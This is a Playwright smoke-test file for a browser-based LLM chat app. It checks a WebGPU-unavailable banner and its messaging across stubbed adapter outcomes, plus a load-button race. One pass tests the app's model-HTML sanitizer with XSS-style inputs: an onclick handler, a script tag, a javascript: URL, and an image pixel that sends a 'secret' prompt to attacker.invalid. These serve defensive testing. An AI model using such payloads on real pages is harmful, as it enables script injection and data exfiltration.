// ThoxWebby WebGPU-banner smoke test.
// Checked-in regression guard for the graceful WebGPU-unavailable banner.
//
// All passes use deterministic navigator.gpu stubs (injected before page scripts
// run) so the test does NOT depend on the CI runner having a real WebGPU stack -
// it asserts how OUR code reacts to each adapter outcome.
//
//   A0) navigator.gpu absent                     -> banner ON,  reason=no-webgpu-api
//   A1) navigator.gpu.requestAdapter() -> null   -> banner ON,  reason=no-adapter
//   A2) navigator.gpu.requestAdapter() -> throws -> banner ON,  reason=error
//   A3) forced click during checkWebGPU()   -> banner ON, no "Failed to load" toast
//   B ) navigator.gpu.requestAdapter() -> adapter -> banner OFF (no regression)
//
// Every banner-ON pass also asserts the user-facing content of the banner
// (title, pitch, browser checklist, chrome://gpu hint) so CI catches
// regressions in the messaging, not just the visibility toggle.
//
// Run locally:  npm test
// Run in CI:    .github/workflows/webgpu-banner-smoke.yml
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, "..");
const PORT = Number(process.env.PORT) || 8139;
const URL = `http://127.0.0.1:${PORT}/`;

const MIME = {
  ".html": "text/html",
  ".js": "text/javascript",
  ".mjs": "text/javascript",
  ".json": "application/json",
  ".svg": "image/svg+xml",
  ".webmanifest": "application/manifest+json",
  ".png": "image/png",
};

const LAUNCH_ARGS = [
  "--enable-unsafe-webgpu",
  "--enable-features=Vulkan,UseSkiaRenderer",
  "--ignore-gpu-blocklist",
  "--enable-webgpu",
];

function startServer() {
  return new Promise((resolve) => {
    const srv = http.createServer((req, res) => {
      let p = decodeURIComponent((req.url || "/").split("?")[0]);
      if (p === "/") p = "/index.html";
      const fp = path.join(ROOT, p);
      fs.readFile(fp, (err, data) => {
        if (err) {
          res.writeHead(404);
          res.end("404");
          return;
        }
        res.writeHead(200, {
          "Content-Type": MIME[path.extname(fp)] || "application/octet-stream",
        });
        res.end(data);
      });
    });
    srv.listen(PORT, "127.0.0.1", () => resolve(srv));
  });
}

async function probe(page) {
  return page.evaluate(() => {
    const banner = document.getElementById("webgpuBanner");
    const reason = document.getElementById("webgpuReason");
    const input = document.getElementById("input");
    const loadBtn = document.getElementById("loadBtn");
    const headLoadBtn = document.getElementById("headLoadBtn");
    const cs = banner ? getComputedStyle(banner) : null;
    return {
      bannerExists: !!banner,
      bannerHidden: banner ? banner.hidden : null,
      bannerDisplay: cs ? cs.display : null,
      bannerText: banner ? banner.textContent : "",
      bannerRole: banner ? banner.getAttribute("role") : null,
      bannerAriaLive: banner ? banner.getAttribute("aria-live") : null,
      reason: reason ? reason.textContent : null,
      textareaDisabled: input ? input.disabled : null,
      textareaPlaceholder: input ? input.placeholder : null,
      loadBtnDisabled: loadBtn ? loadBtn.disabled : null,
      headLoadBtnDisabled: headLoadBtn ? headLoadBtn.disabled : null,
      loadBtnTitle: loadBtn ? loadBtn.title : null,
      statusText: document.getElementById("statusText")
        ? document.getElementById("statusText").textContent
        : null,
      bodyBg: getComputedStyle(document.body).backgroundColor,
    };
  });
}

let failures = 0;
function assert(name, cond, detail) {
  if (cond) {
    console.log("  ok - " + name);
  } else {
    console.error("  FAIL - " + name + (detail ? " :: " + detail : ""));
    failures++;
  }
}

// Assert the user-facing content of the banner is present. Called from every
// banner-ON scenario (A0/A1/A2) so CI catches copy/checklist regressions, not
// just the visibility toggle.
function assertBannerContent(i) {
  const t = i.bannerText || "";
  const preview = JSON.stringify(t.replace(/\s+/g, " ").slice(0, 160));
  assert("banner header 'WebGPU not available' present", t.includes("WebGPU not available"), "text=" + preview);
  assert("banner distinguishes local inference from downloads", t.includes("inference runs in your browser") && t.includes("downloads application assets and model files"), "text=" + preview);
  assert("banner states prompt boundary", t.includes("prompts are not sent to an inference API"), "text=" + preview);
  assert("banner checklist Chrome present", t.includes("Chrome 113") || t.includes("Chrome"), "text=" + preview);
  assert("banner checklist Edge present", t.includes("Edge"), "text=" + preview);
  assert("banner checklist chrome://gpu hint present", t.includes("chrome://gpu"), "text=" + preview);
  // A11y: role='status' + aria-live='polite' is the correct semantic for
  // non-time-critical guidance (role='alert' would force assertive delivery,
  // conflicting with the polite live region).
  assert("banner role='status'", i.bannerRole === "status", "role=" + i.bannerRole);
  assert("banner aria-live='polite'", i.bannerAriaLive === "polite", "aria-live=" + i.bannerAriaLive);
}

async function runPass(label, initScript, assertFn) {
  console.log(label);
  const browser = await chromium.launch({ headless: true, args: LAUNCH_ARGS });
  try {
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
    if (initScript) await ctx.addInitScript(initScript);
    const page = await ctx.newPage();
    await page.goto(URL, { waitUntil: "load", timeout: 30000 });
    // checkWebGPU() is async; give its promise a moment to resolve.
    await page.waitForTimeout(1500);
    const i = await probe(page);
    assertFn(i);
  } finally {
    await browser.close();
  }
}

(async () => {
  const srv = await startServer();
  try {
    // A0: navigator.gpu absent -> no-webgpu-api branch.
    await runPass(
      "Pass A0: navigator.gpu absent -> banner ON, reason=no-webgpu-api",
      () => {
        // Remove navigator.gpu so the "gpu" in navigator check fails.
        Object.defineProperty(navigator, "gpu", { value: undefined, configurable: true });
      },
      (i) => {
        assert("banner element present", i.bannerExists === true);
        assert("#webgpuBanner[hidden] === false (toggled ON)", i.bannerHidden === false, "hidden=" + i.bannerHidden);
        assert("banner computed display: block", i.bannerDisplay === "block", "display=" + i.bannerDisplay);
        assert("reason chip no-webgpu-api", i.reason === "no-webgpu-api", "reason=" + i.reason);
        assert("loadBtn disabled", i.loadBtnDisabled === true, "disabled=" + i.loadBtnDisabled);
        assert("headLoadBtn disabled", i.headLoadBtnDisabled === true, "disabled=" + i.headLoadBtnDisabled);
        assert("loadBtn tooltip set", /WebGPU is unavailable/.test(i.loadBtnTitle || ""), "title=" + i.loadBtnTitle);
        assert("placeholder actionable", /WebGPU is not available/.test(i.textareaPlaceholder || ""), "placeholder=" + i.textareaPlaceholder);
        assert("status error set", /WebGPU|adapter/i.test(i.statusText || ""), "status=" + i.statusText);
        assert("body background #09090b", i.bodyBg === "rgb(9, 9, 11)", "bg=" + i.bodyBg);
        assertBannerContent(i);
      }
    );

    console.log("Pass C: model HTML sanitizer blocks active and auto-fetching content");
    {
      const browser = await chromium.launch({ headless: true, args: LAUNCH_ARGS });
      try {
        const page = await browser.newPage();
        await page.goto(URL, { waitUntil: "load", timeout: 30000 });
        const sanitized = await page.evaluate(async () => {
          const { sanitizeModelHtml } = await import("/safe-markdown.js");
          return sanitizeModelHtml(
            '<p onclick="alert(1)">ok</p>' +
            '<img src="https://attacker.invalid/pixel?prompt=secret">' +
            '<script>alert(1)</script>' +
            '<a href="javascript:alert(1)">bad</a>' +
            '<a href="https://example.com/path">good</a>'
          );
        });
        assert("sanitizer preserves safe text", sanitized.includes("<p>ok</p>"), sanitized);
        assert("sanitizer removes event handlers", !sanitized.includes("onclick"), sanitized);
        assert("sanitizer removes remote image requests", !sanitized.includes("<img"), sanitized);
        assert("sanitizer removes scripts", !sanitized.includes("<script"), sanitized);
        assert("sanitizer removes javascript URLs", !sanitized.includes("javascript:"), sanitized);
        assert("external links are isolated", /target="_blank"/.test(sanitized) && /noopener noreferrer/.test(sanitized), sanitized);
      } finally {
        await browser.close();
      }
    }

    // A1: navigator.gpu present but requestAdapter() resolves null -> no-adapter branch.
    await runPass(
      "Pass A1: requestAdapter() -> null -> banner ON, reason=no-adapter",
      () => {
        if (!navigator.gpu) {
          Object.defineProperty(navigator, "gpu", { value: {}, configurable: true });
        }
        navigator.gpu.requestAdapter = async () => null;
      },
      (i) => {
        assert("#webgpuBanner[hidden] === false (toggled ON)", i.bannerHidden === false, "hidden=" + i.bannerHidden);
        assert("banner computed display: block", i.bannerDisplay === "block", "display=" + i.bannerDisplay);
        assert("reason chip no-adapter", i.reason === "no-adapter", "reason=" + i.reason);
        assert("loadBtn disabled", i.loadBtnDisabled === true, "disabled=" + i.loadBtnDisabled);
        assert("headLoadBtn disabled", i.headLoadBtnDisabled === true, "disabled=" + i.headLoadBtnDisabled);
        assert("placeholder actionable", /WebGPU is not available/.test(i.textareaPlaceholder || ""), "placeholder=" + i.textareaPlaceholder);
        assert("body background #09090b", i.bodyBg === "rgb(9, 9, 11)", "bg=" + i.bodyBg);
        assertBannerContent(i);
      }
    );

    // A2: navigator.gpu present but requestAdapter() throws -> error branch.
    // Closes G1: the "adapter query blew up" path was previously untested even
    // though checkWebGPU() wraps requestAdapter() in try/catch and surfaces
    // reason="error".
    await runPass(
      "Pass A2: requestAdapter() throws -> banner ON, reason=error",
      () => {
        Object.defineProperty(navigator, "gpu", {
          configurable: true,
          value: {
            requestAdapter: () => Promise.reject(new Error("WebGPU adapter query failed")),
          },
        });
      },
      (i) => {
        assert("#webgpuBanner[hidden] === false (toggled ON)", i.bannerHidden === false, "hidden=" + i.bannerHidden);
        assert("banner computed display: block", i.bannerDisplay === "block", "display=" + i.bannerDisplay);
        assert("reason chip error", i.reason === "error", "reason=" + i.reason);
        assert("loadBtn disabled", i.loadBtnDisabled === true, "disabled=" + i.loadBtnDisabled);
        assert("headLoadBtn disabled", i.headLoadBtnDisabled === true, "disabled=" + i.headLoadBtnDisabled);
        assert("placeholder mentions WebGPU", /WebGPU/.test(i.textareaPlaceholder || ""), "placeholder=" + i.textareaPlaceholder);
        assert("body background #09090b", i.bodyBg === "rgb(9, 9, 11)", "bg=" + i.bodyBg);
        assertBannerContent(i);
      }
    );

    // B: navigator.gpu present, requestAdapter() resolves a fake adapter -> banner OFF.
    await runPass(
      "Pass B: requestAdapter() -> adapter -> banner OFF (no regression)",
      () => {
        if (!navigator.gpu) {
          Object.defineProperty(navigator, "gpu", { value: {}, configurable: true });
        }
        navigator.gpu.requestAdapter = async () => ({
          requestDevice: async () => ({}),
          info: {},
          limits: {},
        });
      },
      (i) => {
        assert("#webgpuBanner[hidden] === true (toggled OFF)", i.bannerHidden === true, "hidden=" + i.bannerHidden);
        assert("banner computed display: none", i.bannerDisplay === "none", "display=" + i.bannerDisplay);
        assert("loadBtn enabled", i.loadBtnDisabled === false, "disabled=" + i.loadBtnDisabled);
        assert("headLoadBtn enabled", i.headLoadBtnDisabled === false, "disabled=" + i.headLoadBtnDisabled);
        assert("loadBtn tooltip empty", i.loadBtnTitle === "", "title=" + i.loadBtnTitle);
        assert("placeholder original", i.textareaPlaceholder === "Load the model to start chatting...", "placeholder=" + i.textareaPlaceholder);
        assert("status not error", /WebGPU|adapter/i.test(i.statusText || "") === false, "status=" + i.statusText);
        assert("body background #09090b", i.bodyBg === "rgb(9, 9, 11)", "bg=" + i.bodyBg);
        // R1 a11y: even when banner is hidden the semantic markup must remain
        // role='status' + aria-live='polite'.
        assert("banner role='status'", i.bannerRole === "status", "role=" + i.bannerRole);
        assert("banner aria-live='polite'", i.bannerAriaLive === "polite", "aria-live=" + i.bannerAriaLive);
      }
    );

    // A3: race regression - click Load *during* the async WebGPU probe.
    //
    // Guards R2 from the PR #3/#4/#5 review: before this fix, the Load
    // buttons were enabled at paint and checkWebGPU() was fire-and-forget,
    // so a no-WebGPU click landing between paint and requestAdapter()
    // resolution fell into loadModel()'s catch path and surfaced
    // "Failed to load" instead of the graceful banner. We now ship the
    // buttons disabled with data-webgpu-gated and guard loadModel() with
    // a webgpuReady flag.
    //
    // This pass delays requestAdapter() so the race window is wide, then
    // force-clicks both Load buttons before the promise resolves. The pass
    // asserts the banner is on, buttons stayed disabled, and the status
    // never says "Failed to load".
    console.log('Pass A3: forced click during checkWebGPU() -> banner ON, no \"Failed to load\" toast');
    {
      const browser = await chromium.launch({ headless: true, args: LAUNCH_ARGS });
      try {
        const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
        await ctx.addInitScript(() => {
          if (!navigator.gpu) {
            Object.defineProperty(navigator, 'gpu', { value: {}, configurable: true });
          }
          // Widen the race window so the click reliably lands while the
          // adapter promise is still pending.
          navigator.gpu.requestAdapter = async () => {
            await new Promise((r) => setTimeout(r, 400));
            return null;
          };
        });
        const page = await ctx.newPage();
        await page.goto(URL, { waitUntil: 'load', timeout: 30000 });
        // Force clicks that bypass the disabled attribute, simulating a
        // client-side dispatch that races the pending adapter probe.
        await page.click('#loadBtn', { force: true, timeout: 1000 }).catch(() => {});
        await page.click('#headLoadBtn', { force: true, timeout: 1000 }).catch(() => {});
        // Let the delayed requestAdapter() resolve and the banner render.
        await page.waitForTimeout(1500);
        const i = await probe(page);
        assert('A3 banner ON', i.bannerHidden === false, 'hidden=' + i.bannerHidden);
        assert('A3 reason no-adapter', i.reason === 'no-adapter', 'reason=' + i.reason);
        assert('A3 loadBtn stayed disabled', i.loadBtnDisabled === true, 'disabled=' + i.loadBtnDisabled);
        assert('A3 headLoadBtn stayed disabled', i.headLoadBtnDisabled === true, 'disabled=' + i.headLoadBtnDisabled);
        assert('A3 no \"Failed to load\" toast', !/Failed to load/i.test(i.statusText || ''), 'status=' + i.statusText);
      } finally {
        await browser.close();
      }
    }
  } finally {
    srv.close();
  }

  if (failures > 0) {
    console.error("\n" + failures + " assertion(s) failed");
    process.exit(1);
  }
  console.log("\nAll WebGPU-banner smoke assertions passed");
})();
